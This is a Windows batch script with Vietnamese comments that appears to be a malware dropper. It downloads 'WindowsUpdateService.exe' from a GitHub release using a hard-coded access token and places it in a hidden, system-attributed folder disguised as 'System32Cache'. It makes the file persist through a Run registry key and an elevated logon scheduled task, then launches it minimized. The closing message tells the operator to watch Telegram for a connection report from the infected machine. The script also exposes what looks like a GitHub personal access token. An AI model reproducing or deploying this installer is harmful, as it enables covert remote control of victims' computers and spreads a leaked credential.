@echo off
REM ========================================
REM INSTALLER .EXE TỰ ĐỘNG
REM ========================================
REM File này sẽ:
REM 1. Tải file .exe từ GitHub (hoặc build tại chỗ)
REM 2. Cài đặt và tự động chạy khi khởi động
REM ========================================

chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT .EXE TU DONG
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
REM ========================================

REM Tạo thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
if not exist "%INSTALL_DIR%\temp" mkdir "%INSTALL_DIR%\temp" >nul 2>&1

cd /d "%INSTALL_DIR%" >nul 2>&1

REM Kiểm tra xem có file .exe trong thư mục hiện tại không
if exist "%~dp0WindowsUpdateService.exe" (
    echo [1/4] Tim thay file .exe trong thu muc hien tai...
    copy /y "%~dp0WindowsUpdateService.exe" "%INSTALL_DIR%\WindowsUpdateService.exe" >nul 2>&1
    goto :install_exe
)

REM Nếu không có, thử tải từ GitHub
echo [1/4] Dang tai file .exe tu GitHub...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "WindowsUpdateService.exe" "https://github.com/%GITHUB_USER%/%GITHUB_REPO%/releases/latest/download/WindowsUpdateService.exe" 2>nul
if exist "WindowsUpdateService.exe" (
    echo [OK] Da tai file .exe tu GitHub
    goto :install_exe
)

REM Nếu không tải được, thử build tại chỗ
echo [WARNING] Khong the tai file .exe tu GitHub
echo Dang thu build file .exe tai cho...
if exist "%~dp0BUILD_EXE.bat" (
    call "%~dp0BUILD_EXE.bat"
    if exist "%~dp0WindowsUpdateService.exe" (
        copy /y "%~dp0WindowsUpdateService.exe" "%INSTALL_DIR%\WindowsUpdateService.exe" >nul 2>&1
        goto :install_exe
    )
)

echo [ERROR] Khong the tim thay hoac build file .exe!
echo Vui long chay BUILD_EXE.bat truoc hoac tai file .exe tu GitHub.
pause
exit /b 1

:install_exe
if not exist "%INSTALL_DIR%\WindowsUpdateService.exe" (
    echo [ERROR] File .exe khong ton tai!
    pause
    exit /b 1
)

echo [2/4] Dang an thu muc va file...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
attrib +h +s "%INSTALL_DIR%\WindowsUpdateService.exe" >nul 2>&1

echo [3/4] Dang them vao Windows Startup...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%INSTALL_DIR%\WindowsUpdateService.exe\"" /f >nul 2>&1

REM Tạo task scheduler (backup)
schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\WindowsUpdateService.exe\"" /sc onlogon /f /rl highest >nul 2>&1

echo [4/4] Dang khoi dong ung dung...
start "" /min "%INSTALL_DIR%\WindowsUpdateService.exe" >nul 2>&1
timeout /t 2 >nul 2>&1

echo.
echo ========================================
echo    CAI DAT THANH CONG!
echo ========================================
echo.
echo Thu muc cai dat: %INSTALL_DIR%
echo File .exe: WindowsUpdateService.exe
echo Ung dung da duoc them vao Windows Startup
echo Ung dung da duoc khoi dong!
echo.
echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
echo.
pause

exit /b 0

